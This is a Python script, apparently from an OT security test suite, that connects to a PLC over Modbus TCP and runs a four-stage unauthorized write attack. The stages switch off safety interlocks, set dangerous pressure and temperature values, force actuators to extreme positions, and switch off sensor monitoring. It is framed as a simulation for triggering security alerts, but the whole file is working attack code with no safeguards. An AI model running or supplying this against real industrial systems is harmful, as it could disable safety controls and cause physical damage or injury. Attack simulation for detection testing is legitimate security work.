#!/usr/bin/env python3
"""
03_modbus_write_attack.py: Unauthorized Modbus write attack simulation.

Executes unauthorized writes to PLC registers with dangerous values
to simulate critical OT attack scenarios and trigger security alerts.
"""

import json
import logging
import sys
import time
from datetime import datetime
from typing import Dict, List, Optional, Any

from pymodbus.client import ModbusTcpClient
from pymodbus.exceptions import ModbusException

# Configure logging
logging.basicConfig(
    level=logging.WARNING,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)


class ModbusWriteAttack:
    """Simulates unauthorized Modbus write attacks."""

    def __init__(
        self,
        host: str = "192.168.1.100",
        port: int = 502,
        unit_id: int = 1
    ):
        """
        Initialize attack payload generator.

        Args:
            host: Target PLC/RTU IP address.
            port: Modbus TCP port (default 502).
            unit_id: Modbus unit identifier.
        """
        self.host = host
        self.port = port
        self.unit_id = unit_id
        self.client = ModbusTcpClient(host=host, port=port, timeout=10)
        self.attack_log = []

    def connect(self) -> bool:
        """Establish connection to target."""
        try:
            if self.client.connect():
                logger.warning(f"Connected to target {self.host}:{self.port}")
                return True
            else:
                logger.error(f"Connection failed to {self.host}:{self.port}")
                return False
        except Exception as e:
            logger.error(f"Connection error: {str(e)}")
            return False

    def write_dangerous_registers(
        self,
        start_address: int,
        values: List[int],
        description: str = ""
    ) -> Optional[bool]:
        """
        Write dangerous values to PLC holding registers.

        Args:
            start_address: Target register address.
            values: Register values to write.
            description: Attack description for logging.

        Returns:
            True if write successful, False otherwise.
        """
        try:
            result = self.client.write_registers(
                address=start_address,
                values=values,
                slave=self.unit_id
            )

            if not result.isError():
                attack_record = {
                    "timestamp": datetime.utcnow().isoformat(),
                    "attack_type": "unauthorized_register_write",
                    "description": description,
                    "target_registers": {
                        "start_address": start_address,
                        "values": values,
                        "count": len(values)
                    },
                    "success": True
                }
                self.attack_log.append(attack_record)
                logger.warning(
                    f"ATTACK: Wrote {len(values)} registers at {start_address}: {description}"
                )
                return True
            else:
                logger.error(f"Write failed: {result}")
                return False

        except ModbusException as e:
            logger.error(f"Modbus exception: {str(e)}")
            return False

    def write_dangerous_coils(
        self,
        start_address: int,
        values: List[bool],
        description: str = ""
    ) -> Optional[bool]:
        """
        Write dangerous values to PLC coils.

        Args:
            start_address: Target coil address.
            values: Coil values (True/False) to write.
            description: Attack description for logging.

        Returns:
            True if write successful, False otherwise.
        """
        try:
            result = self.client.write_coils(
                address=start_address,
                values=values,
                slave=self.unit_id
            )

            if not result.isError():
                attack_record = {
                    "timestamp": datetime.utcnow().isoformat(),
                    "attack_type": "unauthorized_coil_write",
                    "description": description,
                    "target_coils": {
                        "start_address": start_address,
                        "values": values,
                        "count": len(values)
                    },
                    "success": True
                }
                self.attack_log.append(attack_record)
                logger.warning(f"ATTACK: Wrote {len(values)} coils at {start_address}: {description}")
                return True
            else:
                logger.error(f"Coil write failed: {result}")
                return False

        except ModbusException as e:
            logger.error(f"Modbus exception: {str(e)}")
            return False

    def execute_attack_scenario(self) -> List[Dict[str, Any]]:
        """
        Execute multi-stage attack scenario.

        Returns:
            List of attack records.
        """
        logger.warning("=== INITIATING MODBUS WRITE ATTACK SCENARIO ===")

        # Stage 1: Disable safety interlocks
        self.write_dangerous_coils(
            start_address=100,
            values=[False, False, False],
            description="CRITICAL: Disable safety interlocks"
        )
        time.sleep(2)

        # Stage 2: Set dangerous setpoints
        self.write_dangerous_registers(
            start_address=200,
            values=[5000, 300, 100],
            description="CRITICAL: Set dangerous pressure/temperature setpoints"
        )
        time.sleep(2)

        # Stage 3: Force actuator positions
        self.write_dangerous_registers(
            start_address=300,
            values=[65535, 32768, 0],
            description="CRITICAL: Force all actuators to extreme positions"
        )
        time.sleep(2)

        # Stage 4: Disable monitoring
        self.write_dangerous_coils(
            start_address=110,
            values=[False, False],
            description="CRITICAL: Disable sensor monitoring"
        )

        logger.warning(f"Attack scenario complete: {len(self.attack_log)} operations executed")
        return self.attack_log

    def disconnect(self) -> None:
        """Close connection."""
        self.client.close()
        logger.info("Disconnected")

    def export_attack_log(self, filepath: str) -> None:
        """Export attack log to JSON."""
        try:
            with open(filepath, 'w') as f:
                json.dump(self.attack_log, f, indent=2)
            logger.info(f"Attack log exported to {filepath}")
        except Exception as e:
            logger.error(f"Export failed: {str(e)}")


def main() -> int:
    """Execute Modbus write attack."""
    attacker = ModbusWriteAttack(host="192.168.1.100")

    if not attacker.connect():
        return 1

    try:
        attack_log = attacker.execute_attack_scenario()
        attacker.export_attack_log("/tmp/modbus_attack.json")

        print(f"\nAttack log ({len(attack_log)} events):")
        print(json.dumps(attack_log, indent=2))
        return 0

    finally:
        attacker.disconnect()


if __name__ == "__main__":
    sys.exit(main())
